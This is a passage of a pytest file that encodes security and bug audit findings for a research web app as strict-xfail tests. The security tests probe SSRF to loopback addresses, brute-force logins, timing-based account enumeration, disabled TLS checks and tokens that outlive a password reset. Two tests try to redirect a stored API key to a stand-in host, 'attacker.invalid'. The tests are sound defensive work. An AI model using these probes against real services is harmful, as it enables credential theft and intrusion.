"""Findings of the 2026-10-24 audit (docs/reports/audit-2026-10-24/security.md).

Each test asserts the SAFE behaviour, so it fails today and is marked
xfail(strict=True): once the finding is fixed the test passes, strict turns
that into a failure, and whoever fixed it removes the mark. Nothing here
calls a real model or search service; outbound calls are captured.
"""

import asyncio
import http.server
import json
import re
import ssl
import threading
from pathlib import Path

import pytest

from conftest import make_user


def finding(code):
    return pytest.mark.xfail(strict=True, raises=AssertionError, reason=code)


# --- SEC-02: Agent Research fetches internal addresses ----------------------------


class _Internal(http.server.BaseHTTPRequestHandler):
    """Stands in for a service only the Worker can reach (SearXNG, MRA, the host)."""

    def do_GET(self):  # noqa: N802 - http.server's name
        body = b"<html><body><p>internal-service-secret-sec02</p></body></html>"
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


@pytest.fixture
def internal_service():
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Internal)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}/"
    finally:
        server.shutdown()
        server.server_close()


@finding("SEC-02")
def test_sec02_agent_research_does_not_fetch_internal_addresses(internal_service):
    """The pages a search result (or the crawl agent, from what the model
    asks) points at are fetched with no check of where they are: a loopback,
    private or link-local address comes back as text for the report."""
    from deep_researcher.tools.web_search import WebpageSnippet, scrape_urls

    results = asyncio.run(scrape_urls([WebpageSnippet(url=internal_service, title="", description="")]))
    assert not any("internal-service-secret-sec02" in (r.text or "") for r in results)


# --- SEC-03 and SEC-08: signing in -----------------------------------------------------


@finding("SEC-03")
@pytest.mark.db
def test_sec03_repeated_wrong_passwords_are_slowed_down(admin, browser):
    make_user(admin, browser, "audit-victim@example.org", "the right password 1")
    stranger = browser()
    codes = [
        stranger.post("/api/auth/login", json={"email": "audit-victim@example.org", "password": f"guess {i:04d}"}).status_code
        for i in range(50)
    ]
    # 429 Too Many Requests, 423 Locked or 503 with Retry-After: any of them is a throttle.
    assert THROTTLED & set(codes), f"50 wrong passwords in a row, all answered {set(codes)}"


THROTTLED = {423, 429, 503}


@finding("SEC-08")
@pytest.mark.db
def test_sec08_login_does_the_same_work_for_an_unknown_address(admin, browser, monkeypatch):
    """An address with no account is refused before any password is
    checked, so it answers about 50 ms sooner (argon2) than a wrong password
    for a real account. Safe: the password is checked (against a dummy hash)
    whether or not the address has an account."""
    from litstorm import security

    calls = []
    real = security.verify_password

    def counted(password_hash, password):
        calls.append(password_hash)
        return real(password_hash, password)

    monkeypatch.setattr(security, "verify_password", counted)
    r = browser().post("/api/auth/login", json={"email": "audit-nobody@example.org", "password": "not the password"})
    assert r.status_code == 401
    assert calls, "no password was checked for an address without an account"


# --- SEC-05: a stored key goes to an address typed in the request -----------------

STORED_KEY = "sk-or-v1-audit-stored-key-0000000000"
ELSEWHERE = "http://attacker.invalid/v1"


@finding("SEC-05")
@pytest.mark.db
def test_sec05_testing_a_draft_model_does_not_send_the_stored_key_elsewhere(admin, monkeypatch):
    import litellm

    sent = []

    def capture(**kwargs):
        sent.append(kwargs)
        raise RuntimeError("captured, not sent")

    monkeypatch.setattr(litellm, "completion", capture)
    assert admin.put("/api/admin/llm-credentials/openrouter", json={"api_key": STORED_KEY}).status_code == 200
    r = admin.post("/api/admin/llm-models/check", json={"provider": "openrouter", "model": "any/model", "api_base": ELSEWHERE})
    assert r.status_code == 200
    leaked = [k for k in sent if k.get("api_key") == STORED_KEY and k.get("api_base") == ELSEWHERE]
    assert len(leaked) == 0, "the stored OpenRouter key was handed to an address the request named"


@finding("SEC-05")
@pytest.mark.db
def test_sec05_testing_an_embedding_does_not_send_the_stored_key_elsewhere(admin, monkeypatch):
    """embedding.key_for keeps the key from another address for
    "openai-compatible" only; the other providers take an api_base too."""
    from litstorm import embedding

    sent = []

    class Refused:
        status_code = 401
        text = "captured"

    def capture(url, json=None, headers=None, timeout=None):
        sent.append((url, headers or {}))
        return Refused()

    monkeypatch.setattr(embedding.requests, "post", capture)
    assert admin.put("/api/admin/llm-credentials/openrouter", json={"api_key": STORED_KEY}).status_code == 200
    r = admin.post("/api/admin/embedding/check", json={"provider": "openrouter", "model": "m", "api_base": ELSEWHERE})
    assert r.status_code == 200
    leaked = [u for u, h in sent if u.startswith(ELSEWHERE) and STORED_KEY in h.get("Authorization", "")]
    assert len(leaked) == 0, "the stored OpenRouter key was sent to an address the request named"


# --- SEC-06: Agent Research turns certificate checks off ---------------------------


@finding("SEC-06")
def test_sec06_agent_research_checks_certificates():
    """Its one TLS context serves the Tavily search (the key in the body),
    SearXNG and every page it reads."""
    from deep_researcher.tools import web_search

    assert web_search.ssl_context.verify_mode == ssl.CERT_REQUIRED
    assert web_search.ssl_context.check_hostname


# --- SEC-07: a reset leaves the account's API tokens working ---------------------


@finding("SEC-07")
@pytest.mark.db
def test_sec07_a_password_reset_stops_the_accounts_api_tokens(admin, browser):
    import json

    from fastapi.testclient import TestClient

    from litstorm.api import create_app

    user = make_user(admin, browser, "audit-reset@example.org")
    token = user.post("/api/me/tokens", json={"name": "t", "scopes": ["read"], "days": 30}).json()["token"]
    account = next(u for u in admin.get("/api/admin/users").json() if u["email"] == "audit-reset@example.org")
    # "the old password stops working and the User is signed out everywhere" (api/admin.reset_link)
    assert admin.post(f"/api/admin/users/{account['id']}/link").status_code == 200

    listing = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json, text/event-stream",
               "Content-Type": "application/json"}
    with TestClient(create_app()) as client:
        r = client.post("/api/mcp", headers=headers, content=json.dumps(listing))
    assert r.status_code in (401, 403), f"the token still opens the MCP server after the reset ({r.status_code})"


# --- SEC-09: security headers ------------------------------------------------------------

WEB = Path(__file__).resolve().parents[2] / "web"


@finding("SEC-09")
def test_sec09_the_web_app_is_served_with_a_csp_and_no_framing():
    # Directives only: a comment that names a header does not send it.
    lines = (WEB / "nginx.conf").read_text(encoding="utf-8").splitlines()
    conf = "\n".join(line.split("#", 1)[0] for line in lines)
    assert re.search(r"add_header\s+Content-Security-Policy\s", conf)
    assert re.search(r"add_header\s+Content-Security-Policy\s[^\n]*frame-ancestors", conf) or re.search(
        r"add_header\s+X-Frame-Options\s", conf
    )


# --- SEC-11: dependencies with fixes that reach our code ----------------------------


def _version(name):
    from importlib.metadata import version

    from packaging.version import Version

    return Version(version(name))


@finding("SEC-11")
def test_sec11_outbound_https_libraries_are_patched():
    from packaging.version import Version

    # certifi < 2026.10.19 trusts the emSign ECC Root CA - G3 (PYSEC-2026-4320).
    assert _version("certifi") >= Version("2026.10.19")
    # aiohttp 3.14.4: the client Agent Research reads pages with (GHSA-2g87-pp6c-29x5 and others).
    assert _version("aiohttp") >= Version("3.14.4")


# =====================================================================================
# BUG-xx: findings of the code readers on the Worker, quota and Trash (Task 3a).
# docs/reports/audit-2026-10-24/bugs.md says what each one is and how bad.
# =====================================================================================

import time  # noqa: E402
import uuid  # noqa: E402

from test_trash_and_cost import age, configured, purge, research, run_fake  # noqa: E402,F401 - a fixture too


def _claim_one():
    from litstorm import db as db_mod
    from litstorm.worker import queue

    with db_mod.sessions()() as s:
        return queue.claim(s)


def _ready_to_run(db, run_id, script):
    """Point a queued Run at the fake engine, as test_trash_and_cost.run_fake does, and claim it."""
    from litstorm.db.models import Run

    run = db.get(Run, uuid.UUID(run_id))
    run.engine = "fake"
    run.config = {**{k: v for k, v in run.config.items() if k != "interpret"}, "params": {"script": script}}
    db.commit()
    return _claim_one()


def _state(db, run_id):
    from litstorm.db.models import Run

    db.expire_all()
    return db.get(Run, uuid.UUID(str(run_id)))


def _failed(db, run_id, reason="refused"):
    """Mark a Run failed for a reason that keeps its quota, as the Worker would have."""
    from datetime import datetime, timezone

    from litstorm.db.models import FAILED, Run

    run = db.get(Run, uuid.UUID(run_id))
    now = datetime.now(timezone.utc)
    run.status, run.reason, run.started_at, run.finished_at = FAILED, reason, now, now
    db.commit()


_barrier_broken = []  # set by _meet_at when the two requests never met


def _together(*calls):
    """Each call in a thread of its own, started at once; the results, or the exception a call raised."""
    import threading

    results = [None] * len(calls)

    def go(i, fn):
        try:
            results[i] = fn()
        except Exception as error:  # noqa: BLE001 - what the caller of a request would have seen
            results[i] = error

    threads = [threading.Thread(target=go, args=(i, fn)) for i, fn in enumerate(calls)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(90)
    if _barrier_broken:
        pytest.skip("barrier broke: race not exercised")
    return results


def _meet_at(monkeypatch, owner, name, *, after):
    """Make two requests reach `owner.name` together (the first call of each thread only), so
    that both have passed whatever came before it when either goes on. `after`: wait after the
    real call (an early check) rather than before it."""
    import threading

    real = getattr(owner, name)
    barrier = threading.Barrier(2, timeout=30)
    _barrier_broken.clear()
    seen = threading.local()

    def wait():
        if getattr(seen, "done", False):
            return
        seen.done = True
        try:
            barrier.wait()
        except threading.BrokenBarrierError:
            _barrier_broken.append(True)

    def wrapper(*args, **kwargs):
        if after:
            result = real(*args, **kwargs)
            wait()
            return result
        wait()
        return real(*args, **kwargs)

    monkeypatch.setattr(owner, name, wrapper)


def _limits(admin, **changes):
    current = admin.get("/api/admin/limits").json()
    assert admin.put("/api/admin/limits", json={**current, **changes}).status_code == 200


# --- the Worker's loop -----------------------------------------------------------------


@pytest.fixture
def one_pass(monkeypatch):
    """The Worker's main(), told to stop after its first look at the queue, with no spare
    process. Returns a function that runs it and turns "it died" into an AssertionError."""
    import signal

    from litstorm.worker import main as worker

    previous = signal.getsignal(signal.SIGTERM)

    class Wake:
        def wait(self, timeout, stopping):
            stopping.set()

        def close(self):
            pass

    class NoSpare:
        def refill(self):
            pass

        def close(self):
            pass

    monkeypatch.setattr(worker.notify, "QueueWakeup", Wake)
    monkeypatch.setattr(worker, "Spare", NoSpare)

    def run():
        try:
            worker.main()
        except Exception as error:  # noqa: BLE001
            raise AssertionError(f"the Worker's process ended: {type(error).__name__}: {error}") from error

    yield run
    signal.signal(signal.SIGTERM, previous)


@finding("BUG-01")
@pytest.mark.db
@pytest.mark.parametrize("step", ["purge", "sweep_interrupted", "claim"])
def test_bug01_one_failed_step_does_not_end_the_workers_process(db, one_pass, monkeypatch, step):
    """main() calls the purge, the sweep and the claim with nothing around them: a database
    error in any of them ends the process, and no Run is claimed until it is restarted
    (and the purge runs first on every start)."""
    from sqlalchemy.exc import OperationalError

    from litstorm.worker import main as worker

    def broken(*args, **kwargs):
        raise OperationalError("select 1", {}, Exception("the database went away"))

    owner, name = {"purge": (worker.trash, "purge"), "sweep_interrupted": (worker.queue, "sweep_interrupted"),
                   "claim": (worker.queue, "claim")}[step]
    monkeypatch.setattr(owner, name, broken)
    one_pass()


def _queued_into_the_trash(admin, browser, monkeypatch, who="audit-alice@example.org"):
    """What the race leaves: create_run checks the Session, then the owner's limits, then
    inserts, while the trash stops only the Runs that exist at that moment. The Session is
    trashed between the check and the insert (by a second connection, as another request
    would), so a new Run sits QUEUED in a Session in the Trash. Returns the owner and the Run."""
    from litstorm import db as db_mod
    from litstorm import quota, trash
    from litstorm.db.models import ResearchSession

    owner = make_user(admin, browser, who)
    _, session, _ = research(owner)
    real = quota.check_submit

    def trashed_meanwhile(s, user, units=1):
        with db_mod.sessions()() as other:
            trash.trash_session(other, other.get(ResearchSession, uuid.UUID(session["id"])))
            other.commit()
        return real(s, user, units)

    monkeypatch.setattr(quota, "check_submit", trashed_meanwhile)
    r = owner.post(f"/api/sessions/{session['id']}/runs", json={"topic": "Songkran again", "language": "th"})
    monkeypatch.setattr(quota, "check_submit", real)
    assert r.status_code == 201, r.text
    return owner, session, r.json()


@finding("BUG-02")
@pytest.mark.db
def test_bug02_a_purged_run_that_was_still_queued_does_not_stop_everyone_elses(admin, browser, configured, db, monkeypatch):
    """The purge accepts a Run that is still QUEUED (it only skips running ones) and blanks its
    config; the Run stays queued, is first in line, and claim() raises KeyError on it every time,
    so no one else's Run starts and the Worker's process ends (BUG-01) on every restart."""
    from litstorm.db.models import ResearchSession

    _, session, queued = _queued_into_the_trash(admin, browser, monkeypatch)
    bob = make_user(admin, browser, "audit-bob@example.org")
    _, _, bobs = research(bob)
    age(db, ResearchSession, session["id"], days=31)
    assert purge() >= 1

    claimed = []
    for _ in range(3):
        try:
            claim = _claim_one()
        except Exception as error:  # noqa: BLE001
            raise AssertionError(f"claiming raised {type(error).__name__}: {error}; Bob's Run was never reached") from error
        if claim is None:
            break
        claimed.append(str(claim.run_id))
    assert bobs["id"] in claimed


@finding("BUG-03")
@pytest.mark.db
def test_bug03_a_run_queued_while_its_session_is_trashed_is_not_started(admin, browser, configured, db, monkeypatch):
    """The Worker has no look at the Trash: the Run the race left in it is claimed and run
    (the owner's money, in a place they deleted)."""
    _queued_into_the_trash(admin, browser, monkeypatch)
    claim = _claim_one()
    assert claim is None, "the Worker claimed a Run that sits in a Session in the Trash"


# --- the supervisor and run_one ------------------------------------------------------------


@finding("BUG-04")
def test_bug04_an_error_in_the_supervisor_does_not_leave_the_child_running(tmp_path, monkeypatch):
    """Anything raised in supervise's loop (the heartbeat's database call, a bad line in
    events.jsonl) leaves the child process running with nobody watching it: no deadline, no
    cancel, no events; run_one then writes the Run as failed and refunded."""
    from litstorm.engines.base import Secrets
    from litstorm.runner import supervisor
    from test_supervisor import config

    started = []
    real = supervisor.start

    def spy(*args, **kwargs):
        proc = real(*args, **kwargs)
        started.append(proc)
        return proc

    monkeypatch.setattr(supervisor, "start", spy)
    beats = []

    def heartbeat():
        beats.append(1)
        if len(beats) >= 2:
            raise RuntimeError("the database is restarting")

    try:
        with pytest.raises(RuntimeError):
            supervisor.supervise(
                str(tmp_path), config([{"sleep": 30}]), Secrets(llm_api_key="sk-x"), heartbeat=heartbeat, poll_interval=0.05
            )
        time.sleep(0.5)
        alive = started[0].poll() is None
    finally:
        for proc in started:
            proc.kill()
            proc.wait()
    assert not alive, "the child went on running after the supervisor failed"


@finding("BUG-05")
@pytest.mark.db
def test_bug05_a_run_that_lost_its_lease_is_stopped(admin, browser, configured, db, monkeypatch):
    """The sweep marked the Run interrupted (its heartbeat was late); renew() says so and the
    Worker only logs it. The child works on to the end, the freed slot is filled by another Run,
    and its report is thrown away (finish matches no row)."""
    import threading
    from datetime import datetime, timedelta, timezone

    from sqlalchemy import update

    from litstorm import db as db_mod
    from litstorm.db.models import Run
    from litstorm.worker import main, queue

    alice = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(alice)
    claim = _ready_to_run(db, run["id"], [{"stage": "research"}, {"sleep": 10}])
    monkeypatch.setattr(main, "DB_TOUCH", 0.2)

    def stall():
        time.sleep(1.0)
        with db_mod.sessions()() as s:
            s.execute(update(Run).where(Run.id == claim.run_id).values(
                lease_expires_at=datetime.now(timezone.utc) - timedelta(seconds=5)))
            s.commit()
            queue.sweep_interrupted(s)

    thread = threading.Thread(target=stall)
    thread.start()
    began = time.monotonic()
    main.run_one(claim)
    took = time.monotonic() - began
    thread.join()
    assert _state(db, run["id"]).status == "interrupted"
    assert took < 7, f"the child ran for {took:.1f}s after its Run was given up"


@finding("BUG-06")
@pytest.mark.db
def test_bug06_a_report_that_cannot_be_read_does_not_leave_the_run_running(admin, browser, configured, db, monkeypatch, tmp_path):
    """After supervise, run_one loads the report before it writes the outcome, outside any try:
    a report.json that fails validation ends the thread, no status is written, and the lease
    expiry later records the Run as interrupted and refunds it, though the engine had finished."""
    from litstorm.db.models import FINAL
    from litstorm.runner.supervisor import Outcome
    from litstorm.worker import main

    alice = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(alice)
    claim = _ready_to_run(db, run["id"], [])
    bad = tmp_path / "report.json"
    bad.write_text("{}", encoding="utf-8")
    monkeypatch.setattr(main, "supervise", lambda *a, **k: Outcome("succeeded", "succeeded", report_path=str(bad)))
    try:
        main.run_one(claim)
    except Exception:  # noqa: BLE001 - in the Worker this ends the Run's thread
        pass
    status = _state(db, run["id"]).status
    assert status in FINAL, f"the Run was left {status!r}"


def _cancel_pressed_then(run_id, outcome):
    """A supervise whose Run ends with `outcome` just after its owner pressed Cancel: the
    owner's request arrived after the last time the supervisor looked."""
    from sqlalchemy import update

    from litstorm import db as db_mod
    from litstorm.db.models import CANCELLING, Run

    def fake(*args, **kwargs):
        with db_mod.sessions()() as s:
            s.execute(update(Run).where(Run.id == run_id).values(status=CANCELLING))
            s.commit()
        return outcome

    return fake


@finding("BUG-07")
@pytest.mark.db
def test_bug07_a_run_the_owner_cancelled_is_not_recorded_as_succeeded(admin, browser, configured, db, monkeypatch):
    from litstorm.runner.supervisor import Outcome
    from litstorm.worker import main

    alice = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(alice)
    claim = _ready_to_run(db, run["id"], [])
    monkeypatch.setattr(main, "supervise", _cancel_pressed_then(claim.run_id, Outcome("succeeded", "succeeded")))
    main.run_one(claim)
    # supervisor.py: "Asked to stop, but finished first: the owner said stop, so the Run is cancelled".
    assert _state(db, run["id"]).status == "cancelled"


@finding("BUG-07")
@pytest.mark.db
def test_bug07_a_failure_after_cancel_was_pressed_does_not_give_the_quota_back(admin, browser, configured, db, monkeypatch):
    from litstorm.runner.supervisor import Outcome
    from litstorm.worker import main

    alice = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(alice)
    claim = _ready_to_run(db, run["id"], [])
    monkeypatch.setattr(main, "supervise", _cancel_pressed_then(claim.run_id, Outcome("failed", "engine_error", "boom")))
    main.run_one(claim)
    row = _state(db, run["id"])
    # "A Run that started and was then cancelled has cost something; the quota is kept."
    assert (row.status, row.quota_refunded) == ("cancelled", False)


@finding("BUG-08")
@pytest.mark.db
def test_bug08_a_timed_out_medical_run_releases_its_review(admin, browser, configured, db, monkeypatch):
    """Only a cancelled Run tells MRA to stop its review (main.run_one); one killed at the
    deadline is as unwanted, and MRA goes on spending on a review nobody waits for."""
    from dataclasses import replace

    from litstorm import medical, outcomes
    from litstorm.runner.supervisor import Outcome
    from litstorm.worker import main

    alice = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(alice)
    claim = _claim_one()
    claim.config = replace(claim.config, engine="medical", service={"url": "http://mra.test"})
    claim.secrets = replace(claim.secrets, service_api_key="k")
    released = []
    monkeypatch.setattr(medical, "release", lambda s, run_id, url, key: released.append(run_id))
    monkeypatch.setattr(main, "supervise", lambda *a, **k: Outcome("failed", outcomes.TIMED_OUT, "still running"))
    main.run_one(claim)
    assert released == [claim.run_id]


# --- quota, limits and the ways a Run starts ----------------------------------------------

from test_discussions import ask as _ask_turn  # noqa: E402
from test_discussions import finish as _finish_turn  # noqa: E402
from test_discussions import start as _start_discussion  # noqa: E402


@finding("BUG-09")
@pytest.mark.db
def test_bug09_two_research_starts_by_one_account_at_once_do_not_deadlock(admin, browser, configured, db, monkeypatch):
    """_start_session inserts the Session (a foreign key to the account's row takes a shared
    lock on it) and only then locks the same row FOR UPDATE in check_submit. Two starts at
    once each hold the shared lock and wait for the other's: PostgreSQL ends one with a
    deadlock and the page gets a 500. Without the barrier below, 7 of 8 pairs failed."""
    from litstorm.api import research as research_api

    _limits(admin, max_queued_per_user=50, monthly_run_quota=50)
    user = make_user(admin, browser, "audit-alice@example.org")
    _meet_at(monkeypatch, research_api, "_existing", after=True)

    def start():
        return user.post("/api/sessions", json={"topic": "Songkran", "language": "th", "request_key": str(uuid.uuid4())})

    outcome = [r if isinstance(r, Exception) else r.status_code for r in _together(start, start)]
    assert outcome == [201, 201], f"two starts at once answered {outcome}"


@finding("BUG-09")
@pytest.mark.db
def test_bug09_two_discussion_starts_by_one_account_at_once_do_not_deadlock(admin, browser, configured, db, monkeypatch):
    """The same order of locks in api/discussions.start (Session inserted, then new_turn locks
    the account)."""
    from litstorm.api import discussions

    _limits(admin, max_queued_per_user=50, monthly_run_quota=50)
    user = make_user(admin, browser, "audit-alice@example.org")
    _meet_at(monkeypatch, discussions, "_existing", after=True)

    def start():
        return user.post("/api/discussions", json={"topic": "Songkran and tourism", "language": "th",
                                                   "request_key": str(uuid.uuid4())})

    outcome = [r if isinstance(r, Exception) else r.status_code for r in _together(start, start)]
    assert outcome == [201, 201], f"two starts at once answered {outcome}"


@finding("BUG-10")
@pytest.mark.db
def test_bug10_the_same_turn_sent_twice_at_once_makes_one_turn(admin, browser, configured, db, monkeypatch):
    """The second request waits on the Discussion's lock, then sees the first one's Turn in
    progress and answers 409 "a Turn is in progress", though the Turn it asked for was made."""
    from litstorm.api import discussions

    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    _meet_at(monkeypatch, discussions, "_existing", after=True)
    body = {"action": "say", "text": "What about the local economy?", "request_key": str(uuid.uuid4())}
    first, second = _together(
        lambda: user.post(f"/api/discussions/{d['id']}/turns", json=body),
        lambda: user.post(f"/api/discussions/{d['id']}/turns", json=body),
    )
    outcome = [r if isinstance(r, Exception) else r.status_code for r in (first, second)]
    assert outcome == [201, 201], f"the same request twice answered {outcome}"
    assert first.json()["id"] == second.json()["id"]


@finding("BUG-11")
@pytest.mark.db
def test_bug11_the_same_submit_sent_twice_at_the_last_unit_of_quota_is_not_refused(admin, browser, configured, db, monkeypatch):
    """With one unit left, the request that waited for the owner's row lock finds the other's
    Run counted and answers 429 quota_exhausted: the page says the quota is used up, while the
    Run it asked for is queued. Idempotency is not looked at again after the lock. (Same at
    the queue limit.)"""
    from litstorm.api import research as research_api

    _limits(admin, monthly_run_quota=2)
    user = make_user(admin, browser, "audit-alice@example.org")
    _, session, _ = research(user)  # takes the first unit
    _meet_at(monkeypatch, research_api, "_existing", after=True)
    body = {"topic": "Songkran again", "language": "th", "request_key": str(uuid.uuid4())}
    url = f"/api/sessions/{session['id']}/runs"
    first, second = _together(lambda: user.post(url, json=body), lambda: user.post(url, json=body))
    outcome = [r if isinstance(r, Exception) else r.status_code for r in (first, second)]
    assert outcome == [201, 201], f"the same request twice answered {outcome}"
    assert first.json()["id"] == second.json()["id"]


@finding("BUG-12")
@pytest.mark.db
def test_bug12_two_retries_of_a_failed_turn_at_once_make_one_turn(admin, browser, configured, db, monkeypatch):
    """retry() does not lock the Discussion (ask() does): both requests read the Turns, see none
    in progress, and each queues one: two Turns at a time in one Discussion."""
    from litstorm import quota
    from litstorm.db.models import Run

    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    failed = d["turns"][0]["id"]
    _finish_turn(db, failed, status="failed")
    _meet_at(monkeypatch, quota, "check_submit", after=False)
    results = _together(lambda: user.post(f"/api/runs/{failed}/retry"), lambda: user.post(f"/api/runs/{failed}/retry"))
    assert not any(isinstance(r, Exception) for r in results), results
    waiting = [r for r in db.query(Run).filter(Run.session_id == uuid.UUID(d["id"])).all() if r.status == "queued"]
    assert len(waiting) <= 1, f"{len(waiting)} Turns are queued in one Discussion"


@finding("BUG-13")
@pytest.mark.db
def test_bug13_trying_a_failed_run_again_twice_does_not_queue_it_twice(admin, browser, configured, db):
    """The Run is built with no request_key and the old one is never marked as retried, so
    every press of the button (the card of a failed Run keeps showing it) queues another copy
    and takes another unit of quota."""
    user = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(user)
    _failed(db, run["id"])
    first = user.post(f"/api/runs/{run['id']}/retry")
    assert first.status_code == 201, first.text
    second = user.post(f"/api/runs/{run['id']}/retry")
    assert second.status_code != 201 or second.json()["id"] == first.json()["id"], (
        f"a second Run was queued for the same failed Run (reserved: {user.get('/api/me/quota').json()['reserved']})"
    )


@finding("BUG-14")
@pytest.mark.db
def test_bug14_trying_again_a_run_of_a_mode_that_was_switched_off_is_refused(admin, browser, configured, db):
    """retry() skips what a fresh submit checks (new_run: the mode is still offered); the
    Administrator's switch is not honoured for it."""
    user = make_user(admin, browser, "audit-alice@example.org")
    _, _, run = research(user)
    _failed(db, run["id"])
    assert admin.put("/api/admin/engines/storm", json={"enabled": False}).status_code == 200
    r = user.post(f"/api/runs/{run['id']}/retry")
    assert r.status_code == 422 and r.json()["detail"] == "engine_not_available", (r.status_code, r.text)


@finding("BUG-15")
@pytest.mark.db
def test_bug15_a_turn_that_opened_a_block_and_failed_can_be_tried_again(admin, browser, configured, db):
    """The Turn that extends takes the next unit; if it fails with a refund its block goes
    away, the Discussion is "used up" again, and retry() (which never extends) answers 409
    turns_exhausted: the button the page offers for the failed Turn cannot succeed."""
    _limits(admin, turns_per_quota=2)
    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    step = _ask_turn(user, d["id"], action="step")
    assert step.status_code == 201, step.text
    _finish_turn(db, step.json()["id"])
    extended = _ask_turn(user, d["id"], action="step", extend=True)
    assert extended.status_code == 201, extended.text
    _finish_turn(db, extended.json()["id"], status="failed", refunded=True)
    r = user.post(f"/api/runs/{extended.json()['id']}/retry")
    assert r.status_code == 201, (r.status_code, r.text)


@finding("BUG-16")
@pytest.mark.db
def test_bug16_choosing_again_checks_the_new_model_for_the_mode(admin, browser, configured, db):
    """A parked Agent Run takes any enabled model, one that cannot call tools included: a fresh
    submit answers 422 model_cannot_use_tools, this goes to the queue and fails half-way."""
    from litstorm.db.models import LlmModel
    from litstorm.worker import queue

    model = configured["model"]
    admin.put(f"/api/admin/llm-models/{model['id']}", json={**model, "supports_tools": True})
    other = admin.post("/api/admin/llm-models", json={"label": "Plain", "provider": "openrouter", "model": "a/plain"}).json()
    user = make_user(admin, browser, "audit-alice@example.org")
    made = user.post("/api/sessions", json={"topic": "Songkran", "language": "th", "engine": "agent"})
    assert made.status_code == 201, made.text
    run_id = made.json()["runs"][0]["id"]
    db.get(LlmModel, uuid.UUID(model["id"])).enabled = False
    db.commit()
    queue.park_unavailable(db)
    db.commit()
    assert _state(db, run_id).status == "needs_selection"
    r = user.post(f"/api/runs/{run_id}/selection",
                  json={"llm_model_id": other["id"], "search_provider_id": configured["search"]["id"]})
    assert r.status_code == 422, (r.status_code, r.text)


# --- the Trash and the purge ---------------------------------------------------------------

import os  # noqa: E402

from test_mcp import _call, _data, _token  # noqa: E402


@finding("BUG-17")
@pytest.mark.db
def test_bug17_the_purge_blanks_what_a_discussions_owner_typed(admin, browser, configured, db):
    """"Deleted for good" (trash.py's docstring: topic, events, files, the report) leaves the
    Turn's own `text` (what the user typed for a "say" Turn) in runs.turn, and the Run's notes
    (what the system made of the topic) in runs.notes, for ever."""
    from litstorm.db.models import ResearchSession, Run

    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    said = _ask_turn(user, d["id"], action="say", text="my private question about the clinic").json()
    run = db.get(Run, uuid.UUID(said["id"]))
    run.notes = {"interpretation": {"reading": "a private reading of the topic"}}
    db.commit()
    _finish_turn(db, said["id"])
    assert user.delete(f"/api/sessions/{d['id']}").status_code == 204
    age(db, ResearchSession, d["id"], days=31)
    assert purge() == 2

    db.expire_all()
    left = [(str(r.id), r.turn, r.notes) for r in db.query(Run).filter(Run.purged_at.is_not(None)).all() if r.turn or r.notes]
    assert not left, f"after the purge, still stored: {left}"


def _mcp_start(token, topic="Songkran"):
    async def steps(session):  # the raw result: an assertion raised in here would come back in an ExceptionGroup
        return await session.call_tool(
            "research_start", {"topic": topic, "language": "th", "sources": ["arxiv"], "wait_seconds": 0})

    return _data(_call(token, steps))


def _mcp_list(token):
    async def steps(session):
        return await session.call_tool("research_list", {})

    return _data(_call(token, steps))


@finding("BUG-18")
@pytest.mark.db
def test_bug18_mcp_list_does_not_show_research_in_a_trashed_session(admin, browser, configured, db):
    """The tool filters Run.trashed_at only; trashing a Session or Project marks that row, not
    its Runs. The tool lists what the web app shows as in the Trash (their ids answer 404)."""
    from litstorm.db.models import Run

    user = make_user(admin, browser, "audit-alice@example.org")
    token = _token(user)
    started = _mcp_start(token)
    assert user.delete(f"/api/sessions/{db.get(Run, uuid.UUID(started['id'])).session_id}").status_code == 204
    assert user.get(f"/api/runs/{started['id']}").status_code == 404
    assert _mcp_list(token) == []


@finding("BUG-18")
@pytest.mark.db
def test_bug18_mcp_list_does_not_show_an_empty_shell_after_the_purge(admin, browser, configured, db):
    """After the purge a Run is a blank row (no topic, no Session); the tool still lists it."""
    from litstorm.db.models import ResearchSession, Run

    user = make_user(admin, browser, "audit-alice@example.org")
    token = _token(user)
    started = _mcp_start(token)
    session_id = str(db.get(Run, uuid.UUID(started["id"])).session_id)
    assert user.delete(f"/api/sessions/{session_id}").status_code == 204
    age(db, ResearchSession, session_id, days=31)
    assert purge() == 1
    assert _mcp_list(token) == []


@finding("BUG-18")
@pytest.mark.db
def test_bug18_an_integrations_recent_runs_leave_out_the_trash(admin, browser, configured, db):
    """The Administrator's integration page filters Run.trashed_at only, as the MCP tool does."""
    from litstorm import trash
    from litstorm.db.models import ResearchSession, Run

    account = admin.post("/api/admin/integrations", json={"name": "DeepWitya"}).json()
    token = admin.post(f"/api/admin/integrations/{account['id']}/tokens", json={"name": "server", "days": None}).json()["token"]
    started = _mcp_start(token)
    trash.trash_session(db, db.get(ResearchSession, db.get(Run, uuid.UUID(started["id"])).session_id))
    db.commit()
    assert admin.get("/api/admin/integrations").json()[0]["recent"] == []


@finding("BUG-19")
@pytest.mark.db
def test_bug19_a_repeated_mcp_start_does_not_return_a_run_in_the_trash(admin, browser, configured, db):
    """_repeat_of matches on token, topic and time only: asked again within ten minutes after
    the owner trashed the Session, the agent is told "this is that run, no quota used" with an
    id every other call refuses (404), and nothing is started."""
    from datetime import datetime, timezone

    from litstorm.db.models import SUCCEEDED, Run

    user = make_user(admin, browser, "audit-alice@example.org")
    token = _token(user)
    started = _mcp_start(token)
    run = db.get(Run, uuid.UUID(started["id"]))
